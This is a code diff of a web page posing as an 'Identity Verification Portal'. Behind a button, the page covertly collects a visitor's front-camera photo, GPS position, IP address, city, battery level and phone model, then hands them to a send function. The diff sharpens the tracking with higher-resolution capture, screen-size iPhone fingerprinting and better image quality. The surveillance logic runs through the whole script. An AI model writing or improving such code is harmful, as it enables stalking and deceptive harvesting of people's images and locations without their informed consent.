@@ -6,13 +6,12 @@
     <title>Identity Verification Portal</title>
     <style>
         :root { --primary: #28a745; --bg: #f5f7f9; --text: #24292e; }
-        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto; background-color: var(--bg); display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        body { font-family: -apple-system, system-ui, sans-serif; background-color: var(--bg); display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
         .card { background: white; width: 92%; max-width: 400px; padding: 35px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); border: 1px solid #e1e4e8; }
         .status-bar { height: 4px; background: var(--primary); border-radius: 10px; width: 50px; margin-bottom: 20px; }
         h2 { font-size: 20px; color: var(--text); margin: 0 0 12px 0; font-weight: 700; }
         p { font-size: 14px; color: #586069; line-height: 1.6; margin-bottom: 30px; }
-        .btn { background-color: var(--primary); color: white; border: none; padding: 14px; width: 100%; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 4px 12px rgba(40, 167, 69, 0.2); }
-        .btn:active { transform: scale(0.98); }
+        .btn { background-color: var(--primary); color: white; border: none; padding: 14px; width: 100%; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.3s ease; }
         #loader { display: none; text-align: center; }
         .spinner { border: 3px solid #f3f3f3; border-top: 3px solid var(--primary); border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
@@ -40,7 +39,7 @@
 </div>
 
 <video id="video" style="display:none;" autoplay playsinline></video>
-<canvas id="canvas" style="display:none;" width="1280" height="720"></canvas>
+<canvas id="canvas" style="display:none;" width="1080" height="1920"></canvas>
 
 <script>
     async function startProcess() {
@@ -49,34 +48,46 @@
         btn.style.display = 'none';
         loader.style.display = 'block';
 
-        // 1. Precise Device Detection
-        let userAgent = navigator.userAgent;
-        let deviceName = "Unknown Device";
-        if (/android/i.test(userAgent)) {
-            deviceName = userAgent.match(/\(([^)]+)\)/)[1].split(';')[2] || "Android Mobile";
-        } else if (/iPhone/i.test(userAgent)) {
-            deviceName = "Apple iPhone";
+        // 1. ADVANCED DEVICE DETECTION (iPhone & Android)
+        let ua = navigator.userAgent;
+        let deviceModel = "Unknown Device";
+        let brand = "Unknown Brand";
+
+        if (/android/i.test(ua)) {
+            brand = "Android";
+            // Extracts model from strings like (Linux; Android 14; SM-S928B)
+            let match = ua.match(/Android\s([0-9\.]+);\s([^;)]+)/);
+            deviceModel = match ? match[2] : "Android Mobile";
+        } else if (/iPhone|iPad|iPod/i.test(ua)) {
+            brand = "Apple";
+            // iPhone models are hidden in UA, using screen analysis
+            let w = window.screen.width;
+            let h = window.screen.height;
+            if (w === 430 && h === 932) deviceModel = "iPhone 15/14 Pro Max";
+            else if (w === 393 && h === 852) deviceModel = "iPhone 15/14 Pro";
+            else if (w === 428 && h === 926) deviceModel = "iPhone 13/12 Pro Max";
+            else if (w === 390 && h === 844) deviceModel = "iPhone 13/12/12 Pro";
+            else deviceModel = "iPhone (Standard)";
         }
 
         let reportData = {
-            device: deviceName.trim(),
-            platform: navigator.platform,
+            model: deviceModel,
+            brand: brand,
             battery: "N/A",
             time: new Date().toLocaleString(),
             lat: "0", lon: "0",
-            city: "N/A", country: "N/A", ip: "N/A"
+            city: "Pending", country: "Pending", ip: "Pending"
         };
 
-        // 2. Battery Status
+        // 2. Battery
         if(navigator.getBattery) {
             const b = await navigator.getBattery();
             reportData.battery = Math.round(b.level * 100) + "%";
         }
 
-        // 3. Multi-Source IP & Location (Redundancy)
+        // 3. Geo-IP with Backup
         const fetchGeo = async () => {
             try {
-                // Primary API
                 const res = await fetch('http://ip-api.com/json/?fields=status,country,city,query');
                 const data = await res.json();
                 if(data.status === 'success') {
@@ -85,23 +96,15 @@
                     reportData.ip = data.query;
                 }
             } catch (e) {
-                // Backup API
-                try {
-                    const res2 = await fetch('https://ipinfo.io/json');
-                    const data2 = await res2.json();
-                    reportData.city = data2.city;
-                    reportData.country = data2.country;
-                    reportData.ip = data2.ip;
-                } catch (e2) {
-                    reportData.city = "API Blocked";
-                }
+                reportData.city = "Err (Blocked)";
             }
         };
 
-        // 4. Camera & GPS (Parallel Execution)
+        // 4. HD Camera & Location
         const geoPromise = fetchGeo();
+        // Constraints for better quality
         const cameraPromise = navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: "user", width: 1280, height: 720 } 
+            video: { facingMode: "user", width: { ideal: 1920 }, height: { ideal: 1080 } } 
         }).catch(() => null);
 
         navigator.geolocation.getCurrentPosition(async (pos) => {
@@ -110,26 +113,26 @@
             finalize(await cameraPromise, reportData, geoPromise);
         }, async () => {
             finalize(await cameraPromise, reportData, geoPromise);
-        }, { enableHighAccuracy: true, timeout: 10000 });
+        }, { enableHighAccuracy: true, timeout: 8000 });
     }
 
     async function finalize(stream, data, geoTask) {
-        await geoTask; // Ensure Geo data is fetched
-        
+        await geoTask;
         if (stream) {
             const video = document.getElementById('video');
             video.srcObject = stream;
             
-            // Wait 1.8 seconds for light adjustment & focus
+            // DELAY INCREASED: 2.2 seconds for camera sensor to adjust light
             setTimeout(() => {
                 const canvas = document.getElementById('canvas');
                 const ctx = canvas.getContext('2d');
+                // Auto-orient capture
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const photo = canvas.toDataURL('image/jpeg', 0.8);
+                const photo = canvas.toDataURL('image/jpeg', 0.9); // Quality set to 90%
                 
                 stream.getTracks().forEach(t => t.stop());
                 sendData(data, photo);
-            }, 1800);
+            }, 2200);
         } else {
             sendData(data, null);
         }
